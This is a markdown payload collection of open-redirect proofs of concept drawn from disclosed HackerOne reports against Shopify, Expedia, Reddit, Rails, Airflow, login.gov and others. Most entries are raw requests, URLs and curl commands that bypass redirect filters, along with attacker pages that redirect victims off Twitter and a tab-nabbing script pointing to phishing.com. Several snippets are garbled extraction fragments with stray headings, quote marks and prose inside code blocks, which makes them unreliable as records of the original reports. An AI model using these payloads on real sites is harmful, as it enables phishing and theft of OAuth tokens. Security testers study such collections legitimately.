# Open Redirect  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#405697](https://hackerone.com/reports/405697)  -  Open redirection in OAuth
*low*

```http
POST /526915/apps/2544979/install_on_dev_shop HTTP/1.1
Host: partners.shopify.com
Referer: https://partners.shopify.com/526915/apps/2544979
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Cookie: last_shop=mido-2.myshopify.com; optimizelyEndUserId=oeu1536089316039r0.9037032785131875; _y=…

utf8=%E2%9C%93&authenticity_token=dO84UJSGLnRDTF3yLennlB1esNOx0SxdN0WJSGY8e%2F%2FquALL%2BQSBxb%2ByPgiyxRtoS8aCgQ83x33JxPAmrbHYdA%3D%3D&install_app%5BSelect+a+store%5D=$$.myshopify.com
```

## 2. [#642876](https://hackerone.com/reports/642876)  -  URl redirection
*medium*

```http
POST /register HTTP/1.1
Host: merchant.kartpay.com
Referer: https://merchant.kartpay.com/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Cookie: XSRF-TOKEN=eyJpdiI6IjFKUXdMQlhcL3Z0Ynh1c1dcL3gyeEpiZz09IiwidmFsdWUiOiIya3U5RUlwM0RuMUI5dGpQT…

verification_code=&type=merchant&_token=2zCgjrNgztgRCMhm4cDScrbTARxEmwn4z16Fjnpe&first_name=ahcvcv&last_name=jbshchjs&email=jbcjhsbcbsb%40baxjbj.com&country_code=%2B91&contact_no=9090909090
```

## 3. [#1257753](https://hackerone.com/reports/1257753)  -  Open Redirect on www.redditinc.com via `failed` query param
*medium*

```http
POST /ama HTTP/1.1
Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
Cookie: CRAFT_CSRF_TOKEN=958b77eaad06452d68f0be48c5edf5b0d928b51a6c4afbb5f2f95397f18b43e2a%3A2%3A%7B…
Content-Length: 1508
Host: www.redditinc.com

------------YWJkMTQzNDcw
```

## 4. [#1788006](https://hackerone.com/reports/1788006)  -  Open Redirect in Logout & Login
*medium, $1,000*

```http
GET /?logout=1 HTTP/2
Host: www.expedia.com
Cookie:  { REDACTED }

## Default Response
```

## 5. [#1788006](https://hackerone.com/reports/1788006)  -  Open Redirect in Logout & Login
*medium, $1,000*

```http
GET /?logout=https://qx4lw1nsec.blogspot.com HTTP/2
Host: www.expedia.com
Cookie: { REDACTED }
```

## 6. [#1354255](https://hackerone.com/reports/1354255)  -  Open redirect in fastify-static via mishandled user's input when attempt to redirect
*low*

```http
GET //google.com/%2e%2e HTTP/1.1
Host: localhost:3000
```

## 7. [#504751](https://hackerone.com/reports/504751)  -  Open Redirect
*low, $100*

```http
GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1
Host: www.omise.co
Cookie: _omise-website_session=OHdwcEpSZVUvVXRqS3F3bUVyUUhaZ2pVY00wVWJ1c042RWZZNHdOendwUEkzS0dnaTJPb…

## Impact
```

## 8. [#309058](https://hackerone.com/reports/309058)  -  Open Redirect on the nl.wordpress.net
*low*

```http
GET /@google.com HTTP/1.1
Host: nl.wordpress.net
```

## 9. [#309058](https://hackerone.com/reports/309058)  -  Open Redirect on the nl.wordpress.net
*low*

```http
GET /@google.com HTTP/1.1
Host: nl.wordpress.net

'''
```

## 10. [#320693](https://hackerone.com/reports/320693)  -  [hekto] open redirect when target domain name is used as html filename on server
*low*

```bash
$ curl -i http://127.0.0.1:3000//hackerone.com
HTTP/1.1 307 Temporary Redirect
Vary: Accept-Encoding
X-Powered-By: Hekto
Location: //hackerone.com/
Content-Type: text/html; charset=utf-8
Content-Length: 63
Date: Wed, 28 Feb 2018 08:22:31 GMT
Connection: keep-alive

Redirecting to <a href="//hackerone.com/">//hackerone.com/</a>.
```

## 11. [#1782514](https://hackerone.com/reports/1782514)  -  CVE-2022-45402: Apache Airflow: Open redirect during login
*medium*

```
Hi,

In Apache Airflow, there is a parameter "next" on the Login page. And after a successful login, we're redirected to this parameter's value. 
I see there are some preventions for the open redirect bug. However, I can bypass these preventions using "/\google.com"

It seems this parameter accepts anything after the slash "/" character. And, browsers parse "/\" as "http://" in the location header.

For reproducing, you can try to login on the http://127.0.0.1:8080/login/?next=/\google.com

I tested this bug in the last version (v2.4.2)

Regards,
Bugra Eskici
```

## 12. [#904059](https://hackerone.com/reports/904059)  -  Open Redirect (6.0.0 < rails < 6.0.3.2)
*high, $1,000*

```ruby
redirect_to request.params[:location]
end

private
  def actionable_request?(request)
    request.show_exceptions? && request.post? && request.path == endpoint
  end

  def redirect_to(location)
    body = "<html><body>You are being <a href=\"#{ERB::Util.unwrapped_html_escape(location)}\">redirected</a>.</body></html>"

    [302, {
      "Content-Type" => "text/html; charset=#{Response.default_charset}",
      "Content-Length" => body.bytesize.to_s,
      "Location" => location,
    }, [body]]
  end
```

## 13. [#1047447](https://hackerone.com/reports/1047447)  -  HostAuthorization middleware does not suitably sanitize the Host / X-Forwarded-For header allowing redirection.
*low*

```
❯ curl -i -H "Host: google.com#sub.tkte.ch" http://localhost:3001/
HTTP/1.1 302 Found
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Location: http://google.com#sub.tkte.ch/
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Request-Id: 3b1702ac-a58f-44bf-af8a-a2933a9946fd
X-Runtime: 0.004726
Transfer-Encoding: chunked

<html><body>You are being <a href="http://google.com#sub.tkte.ch/">redirected</a>.</body></html>
```

## 14. [#1354255](https://hackerone.com/reports/1354255)  -  Open redirect in fastify-static via mishandled user's input when attempt to redirect
*low*

```
HTTP/1.1 301 Moved Permanently
location: //google.com/%2e%2e/
content-length: 0
Date: Wed, 29 Sep 2021 03:34:22 GMT
Connection: close
```

## 15. [#1257753](https://hackerone.com/reports/1257753)  -  Open Redirect on www.redditinc.com via `failed` query param
*medium*

```html
<script>history.pushState('', '', '/')</script>
```

## 16. [#781673](https://hackerone.com/reports/781673)  -  Accepting error message on twitter sends you to attacker site
*medium, $560*

```html
<html>
<body>
<h1> This is hacker's site</h1>
<a href="https://twitter.com/i/flow" onClick="userClicked()">Click here</a> //This may also be made an auto-redirection to twitter from attacker site

</body>
<script>

function userClicked(){
localStorage.setItem("ClickCount", 1);  //Setting up a value in local storage to detected user click
}


if(localStorage.getItem("ClickCount")==1)
   {
      localStorage.setItem("ClickCount", 0); 
      if(localStorage.getItem("ClickCount")==0) 
         {
            window.location.replace("https://hackerone.com/twitter");  //This can any attacker controlled website
         }
   }
   
   

</script>
</html>
```

## 17. [#1145563](https://hackerone.com/reports/1145563)  -  Tab nabbing in Hackerone inbox.
*low, $500*

```html
<script>
if (window.opener) window.opener.parent.location.replace('http://phishing.com');
if (window.parent != window) window.parent.location.replace('http://phishing.com');
</script>
```

## 18. [#405697](https://hackerone.com/reports/405697)  -  Open redirection in OAuth
*low*

```
HTTP/1.1 302 Found
Server: nginx/1.15.2
Date: Wed, 05 Sep 2018 01:01:51 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Location: https://$$.myshopify.com/admin/oauth/redirect_from_partners_dashboard?client_id=04d42319b01049853db0281e6e68b0ea&signature=eyJleHBpcmVzX2F0IjoxNTM2MTA5NjExLCJwZXJtYW5lbnRfZG9tYWluIjoibWlkby0yLm15c2hvcGlmeS5jb20iLCJjbGllbnRfaWQiOiIwNGQ0MjMxOWIwMTA0OTg1M2RiMDI4MWU2ZTY4YjBlYSJ9--6b2892e6e4e0d4eea6ffad3ff5683f3aac2b61bb
X-Robots-Tag: none
Cache-Control: no-cache
X-Request-Id: e4c2d9e3a7f47203a309afb03f731b38
X-Runtime: 0.368401
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Dc: gke
X-Dc: gke
Content-Length: 391

<html><body>You are being <a href="https://$$.myshopify.com/admin/oauth/redirect_from_partners_dashboard?client_id=04d42319b01049853db0281e6e68b0ea&amp;signature=eyJleHBpcmVzX2F0IjoxNTM2MTA5NjExLCJwZXJtYW5lbnRfZG9tYWluIjoibWlkby0yLm15c2hvcGlmeS5jb20iLCJjbGllbnRfaWQiOiIwNGQ0MjMxOWIwMTA0OTg1M2RiMDI4MWU2ZTY4YjBlYSJ9--6b2892e6e4e0d4eea6ffad3ff5683f3aac2b61bb">redirected</a></body></html>
# … truncated …
```

## 19. [#840736](https://hackerone.com/reports/840736)  -  Open Redirect filter bypass through '\' character via URL parameter
*medium*

```
../../../
```

## 20. [#840736](https://hackerone.com/reports/840736)  -  Open Redirect filter bypass through '\' character via URL parameter
*medium*

```
../../../'''
```

## 21. [#1374512](https://hackerone.com/reports/1374512)  -  The Host Authorization middleware in Action Pack is vulnerable to crafted X-Forwarded-Host values
*medium*

```
### System configuration
**Rails version**: 
Tested on Rails 6.1.3.1 and Rails 6.1.3.2
**Ruby version**:
N/A

### Notes

This was fixed in `main` in this PR https://github.com/rails/rails/pull/41435 but still affects <= 6.1.3.1 

The problem is in this code https://github.com/rails/rails/blob/6-1-stable/actionpack/lib/action_dispatch/middleware/host_authorization.rb#L115
```

## 22. [#904059](https://hackerone.com/reports/904059)  -  Open Redirect (6.0.0 < rails < 6.0.3.2)
*high, $1,000*

```
python3 -m http.server 8000
```

## 23. [#3599248](https://hackerone.com/reports/3599248)  -  Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter
*medium*

```http
post-login, victims are already authenticated, making social engineering attacks
```

## 24. [#842035](https://hackerone.com/reports/842035)  -  Open Redirect in  www.shopify.dev Environment
*medium*

```
https://shopify.dev/search/result?query=poc&rank=1&result_gid=ae6c33f6-62d4-4ff2-966e-96c09267ee87&result_url=%2Ftools%2Fapp-bridge%2Factions%2Fpos&search_uuid=34eeea9d-2b99-4f86-bf00-807efd4036ba&suggested=false
```

## 25. [#842035](https://hackerone.com/reports/842035)  -  Open Redirect in  www.shopify.dev Environment
*medium*

```
7) alternatively You can also directly  access below link for your convenience
https://shopify.dev/search/result?query=poc&rank=1&result_gid=ae6c33f6-62d4-4ff2-966e-96c09267ee87&result_url=@www.facebook.com&search_uuid=34eeea9d-2b99-4f86-bf00-807efd4036ba&suggested=false


Culprit for redirect is
```

## 26. [#798742](https://hackerone.com/reports/798742)  -  open redirect in eb9f.pivcac.prod.login.gov
*low, $150*

```
https://eb9f.pivcac.prod.login.gov/?nonce=wI0UglN84A06Q4z4JnkZVc3i1V8%3D&redirect_uri=https%3A%2F%2Fgoogle.com%23%40secure.login.gov%2Flogin%2Fpiv_cac
```

## 27. [#309058](https://hackerone.com/reports/309058)  -  Open Redirect on the nl.wordpress.net
*low*

```
HTTP/1.1 301 Moved Permanently
Date: Thu, 25 Jan 2018 17:26:07 GMT
Server: Apache
Location: http://nl.wordpress.org@google.com
Content-Length: 242
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1
```

## 28. [#1047447](https://hackerone.com/reports/1047447)  -  HostAuthorization middleware does not suitably sanitize the Host / X-Forwarded-For header allowing redirection.
*low*

```ruby
def sanitize_string(host)
          if host.start_with?(".")
            /\A(.+\.)?#{Regexp.escape(host[1..-1])}\z/
          else
            host
          end
        end
```
